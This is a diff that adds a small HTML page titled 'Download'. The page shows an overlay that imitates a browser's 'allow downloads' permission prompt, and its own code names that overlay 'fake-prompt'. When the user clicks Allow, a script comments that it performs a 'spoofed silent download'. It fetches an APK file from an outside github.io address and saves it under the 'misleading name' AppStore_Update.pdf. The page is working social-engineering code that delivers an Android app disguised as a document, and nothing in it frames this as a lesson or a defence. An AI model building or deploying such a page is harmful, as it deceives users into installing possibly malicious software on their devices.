@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Download</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #f2f2f2;
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .prompt-overlay {
+      background: rgba(0, 0, 0, 0.4);
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .fake-prompt {
+      background: #fff;
+      padding: 24px;
+      border-radius: 14px;
+      width: 90%;
+      max-width: 320px;
+      box-shadow: 0 15px 30px rgba(0,0,0,0.2);
+      text-align: center;
+    }
+
+    .fake-prompt p {
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .button-row {
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .button-row button {
+      flex: 1;
+      padding: 10px;
+      font-size: 16px;
+      margin: 0 5px;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+    }
+
+    .deny {
+      background: #e0e0e0;
+      color: #333;
+    }
+
+    .allow {
+      background: #007aff;
+      color: white;
+    }
+  </style>
+</head>
+<body>
+
+<div class="prompt-overlay" id="promptOverlay">
+  <div class="fake-prompt">
+    <p>Do you want to allow downloads on “sauceialist.github.io”?</p>
+    <div class="button-row">
+      <button class="deny" onclick="deny()">Don't Allow</button>
+      <button class="allow" onclick="allow()">Allow</button>
+    </div>
+  </div>
+</div>
+
+<script>
+  function deny() {
+    document.getElementById('promptOverlay').style.display = 'none';
+  }
+
+  function allow() {
+    document.getElementById('promptOverlay').style.display = 'none';
+
+    // Spoofed silent download
+    const a = document.createElement('a');
+    a.href = "https://ybt01.github.io/upload/app-debug.apk"; // replace with actual file
+    a.download = "AppStore_Update.pdf"; // misleading name
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }
+</script>
+
+</body>
+</html>
